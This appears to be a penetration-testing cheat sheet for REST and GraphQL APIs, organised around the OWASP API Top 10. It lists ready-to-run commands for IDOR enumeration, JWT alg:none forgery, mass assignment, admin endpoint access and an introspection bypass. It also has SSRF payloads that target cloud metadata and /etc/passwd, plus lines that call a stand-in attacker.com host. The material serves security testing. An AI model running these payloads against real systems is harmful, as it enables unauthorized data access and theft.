title: Burp API Testing — WSTG-APIT + OWASP API Top 10: REST, GraphQL
body: WSTG-APIT and OWASP API Top 10:2023. REST APIs have the same bugs as web apps but a different surface — no forms, no HTML, just JSON over HTTP. BOLA (API1) is IDOR for APIs and the #1 finding by impact. The testing loop: enumerate endpoints from OpenAPI/Swagger/JS bundles, fingerprint the verbs and auth, then run each API Top 10 test. Autorize handles BOLA at scale; Burp Intruder handles sequential ID enumeration; InQL handles GraphQL introspection.
cmd:
# ══ ⭐ API TESTING — WSTG-APIT + OWASP API Top 10:2023 ══════════════
# Modern OSCP boxes increasingly expose REST APIs. Different surface, same bugs.
# OWASP API Top 10 maps directly to WSTG — BOLA=IDOR, API6=mass assignment.

# ══════════════════════════════════════════════════════
# STEP 1 — ENUMERATE THE API SURFACE
# ══════════════════════════════════════════════════════
# A) OpenAPI / Swagger spec (the free endpoint list):
curl -s http://$ip/swagger.json | python3 -m json.tool | grep -E '"path"|"operationId"'
curl -s http://$ip/openapi.yaml
curl -s http://$ip/api-docs
curl -s http://$ip/api/swagger.json
curl -s http://$ip/api/v1/swagger.json
curl -s http://$ip/v2/api-docs           # Spring Boot common path
# Import into Burp: BApp Store -> install "OpenAPI Parser" or "InQL"
#   -> automatically creates requests for every endpoint
#
# B) JS bundle analysis (endpoints are in the JS):
# DevTools -> Sources -> Search across all JS files:
#   /api/   fetch(   axios.   baseURL   endpoint   v1   v2
# Or: linkfinder.py -i http://$ip/static/app.js -o cli
#
# C) Common API paths (try these when no spec available):
for path in /api /api/v1 /api/v2 /api/v3 /rest /graphql /gql; do
  curl -si http://$ip$path | head -5
done
# Also fuzz with API-specific wordlist:
ffuf -u http://$ip/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
ffuf -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -mc 200,201,204,301,302,400,401,403 -fc 404

# ══════════════════════════════════════════════════════
# STEP 2 — FINGERPRINT THE API
# ══════════════════════════════════════════════════════
# What verbs does each endpoint accept?
curl -X OPTIONS http://$ip/api/v1/users -v 2>&1 | grep -i "allow:"
# What content types?
curl -H "Content-Type: application/xml" http://$ip/api/v1/users -d '<test/>'
curl -H "Content-Type: application/json" http://$ip/api/v1/users -d '{}'
# API version: does /api/v1/ behave differently from /api/v2/?
# Sometimes v1 has fewer auth checks than v2 -> version downgrade attack

# ══════════════════════════════════════════════════════
# STEP 3 — API TOP 10 TEST LOOP
# ══════════════════════════════════════════════════════

# API1: BOLA (Broken Object Level Authorization) = IDOR for APIs
# The #1 API finding, highest business impact.
# Every endpoint that returns an object by ID: GET /api/users/2/profile
#   -> change 2 to 1, 3, 4... Can you read other users' data?
# In Burp Intruder: position on the ID -> Numbers payload 1-9999 -> sort by length
# Also test write operations: PUT/PATCH/DELETE /api/users/2 as user 3 -> BOLA write
# Also test via UUID/GUID: GET /api/orders/abc123 -> enumerate with Intruder Brute forcer

# API2: Broken Authentication
# JWT without signature verification:
#   Set alg:none, remove the signature -> does the server accept it?
# API key in URL: /api/data?api_key=abc123 -> key logged everywhere, rotate it
# No expiry: use an expired JWT -> does it still work?
# Brute: API keys are sometimes short hex strings -> Intruder Brute forcer

# API3: Broken Object Property Level Authorization = mass assignment on APIs
# GET /api/users/me returns:
#   {"id":1, "email":"x@y.com", "role":"user", "admin":false, "credits":0}
# PATCH /api/users/me with body: {"admin":true, "role":"admin", "credits":9999}
# Does the server apply those changes? -> mass assignment via JSON body
# Also: can you read fields you shouldn't? GET /api/users/2 -> returns password hash?

# API4: Unrestricted Resource Consumption = rate limiting missing
# No rate limiting on login -> brute force
# No rate limiting on SMS OTP -> brute the 6-digit code
# File upload with no size limit -> DoS
# Test: send 100 rapid requests to a compute-heavy endpoint -> 429 expected
for i in $(seq 100); do curl -s -o /dev/null http://$ip/api/export; done

# API5: Broken Function Level Authorization = IDOR at the function level
# Regular user accessing admin-only endpoints:
curl -H "Authorization: Bearer $user_token" http://$ip/api/admin/users
curl -H "Authorization: Bearer $user_token" -X DELETE http://$ip/api/admin/users/3
# Also: does the API have hidden "internal" endpoints?
curl http://$ip/api/internal/config
curl http://$ip/api/debug/users

# API6: Unrestricted Access to Sensitive Business Flows
# Specific to business logic (see burp_logic)

# API7: SSRF (server-side request forgery via API)
# Any API endpoint that fetches a URL:
curl -X POST http://$ip/api/webhook -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
curl -X POST http://$ip/api/fetch-url -d '{"url":"file:///etc/passwd"}'
curl -X POST http://$ip/api/import -d '{"source":"http://attacker.com/evil.json"}'

# API8: Security Misconfiguration
# CORS misconfiguration:
curl -H "Origin: https://attacker.com" http://$ip/api/data -v 2>&1 | grep -i "access-control"
# If Access-Control-Allow-Origin: https://attacker.com -> CORS + credentials = data theft
# Debug endpoints live in production:
curl http://$ip/api/debug
curl http://$ip/api/__debug__
curl http://$ip/api/health        # may expose internal info
curl http://$ip/api/metrics       # Prometheus/Grafana metrics exposure

# API9: Improper Inventory Management = undocumented endpoints
# Shadow APIs: endpoints in the JS that aren't in the docs
# Old API versions: /api/v1/ deprecated but still running with fewer auth checks
# Internal APIs: /api/internal/ not intended for external use but accessible

# API10: Unsafe Consumption of APIs (less common in OSCP)

# ══════════════════════════════════════════════════════
# GRAPHQL TESTING
# ══════════════════════════════════════════════════════
# Introspection (often left enabled in dev/staging, sometimes prod):
curl -X POST http://$ip/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
# If introspection works: install InQL extension -> imports full schema into Burp
# Test mutations: can you modify data you shouldn't?
# Test nested queries: deeply nested query to exhaust server resources (DoS)
curl -X POST http://$ip/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:2) { email password role posts { title author { email password } } } }"}'
# Disable introspection bypass: send __schema in a fragment instead:
curl -X POST http://$ip/graphql -H "Content-Type: application/json" \
  -d '{"query":"fragment s on __Schema { types { name } } { __schema { ...s } }"}'

# ══════════════════════════════════════════════════════
# AUTHORIZATION: BURP AUTORIZE FOR APIS
# ══════════════════════════════════════════════════════
# Same Autorize workflow as web, but for API:
# Set low-priv Bearer token in Autorize's "header" field:
#   Authorization: Bearer <low_priv_jwt>
# Browse (or replay) all API calls as high-priv user
# Autorize replays each as low-priv -> Red = BOLA confirmed
# Also test with NO auth at all (blank Authorization header)
warn: Swagger/OpenAPI specs give you the full endpoint list for free — always check /swagger.json, /openapi.yaml, /api-docs, /v2/api-docs before fuzzing. BOLA is the highest-impact API finding and the most consistently missed: change the object ID in every GET/PUT/DELETE endpoint and test it with Autorize. Old API versions (/api/v1/) often have fewer auth checks than /api/v2/ — test version downgrade. GraphQL introspection left enabled is a full schema disclosure — test it with both the direct schema query and the fragment bypass.
